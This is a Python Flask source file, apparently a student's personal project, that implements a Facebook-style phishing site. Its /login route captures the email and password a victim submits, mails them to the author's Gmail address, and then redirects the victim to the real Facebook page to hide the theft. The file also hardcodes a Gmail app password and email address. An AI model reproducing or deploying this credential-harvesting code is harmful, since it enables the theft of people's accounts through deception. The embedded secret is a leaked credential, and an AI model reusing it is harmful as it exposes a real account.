from flask import Flask, render_template, redirect, request
import requests
from flask_mail import Mail, Message
import os 


# Created by Mohammed Draem 
# Computer software engineer student at Make School, San Francisco , CA
# Personal Project 



app = Flask(__name__)
# https://pythonhosted.org/Flask-Mail/
app.config['MAIL_SERVER'] = 'smtp.gmail.com' # smtp.gmail.com is base on the extension of my email @gmail.com
app.config['MAIL_USE_SSL'] = True # ssl is for incomming mail
# app.config['MAIL_USE_TLS'] = True # Outgoing mail
app.config['MAIL_PORT'] = 465 # incomming mail port
app.config['MAIL_USERNAME'] = "mdrame1133@gmail.com" # your email goes here 
app.config['MAIL_PASSWORD'] = "ybqknebqodfwhibn" # app key from you email provider ( google is currently a 16 character )


# # envaromental variables don't work 
# app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')
# app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')




mail = Mail(app) # mail instance / object 


# home route 
@app.route('/')
def index():
    
    return render_template('index.html') #home page
    



# user hit login button
''' Create a route that takes both GET and POST methods
and render the info in the input to desire destination. for me that destination is my email lol'''

@app.route('/login', methods = ['POST', 'GET'] )
def login():

    

   # user email form form
    userName = request.form.get("emailUsername")
    # ! password with 2 ds so you don't get your variable mixed up
    passwordd = request.form.get("password")
  
    #Form Validation will be done in front end in the html.

    #passing credential as message to my email
    mes = Message(f"Email_User: {userName}, Password: {passwordd}", sender="mdrame1133@gmail.com", recipients=['mdrame113@gmail.com'])
    mail.send(mes)
    
            

    
    ''' If user info is sucessfully passon to this route
        take them to the official facebook page '''


    return redirect('https://www.facebook.com/?stype=lo&jlou=AfeYCZSjoD8RTkU3MoAZ3Zzk5O6_0KBFaxHzBtgy8POvS64NNnPr6s4Lh040YN6f3EdvIxy-f2yf0dFkvw5bjKutIukOdXlipcRz7AVXK6b_EA&smuh=5272&lh=Ac_GsPJ4Lh-aUNQt')

@app.route('/test')
def test():
    pass


    






# main module page 
if __name__ == "__main__":
    app.run(debug=False) 
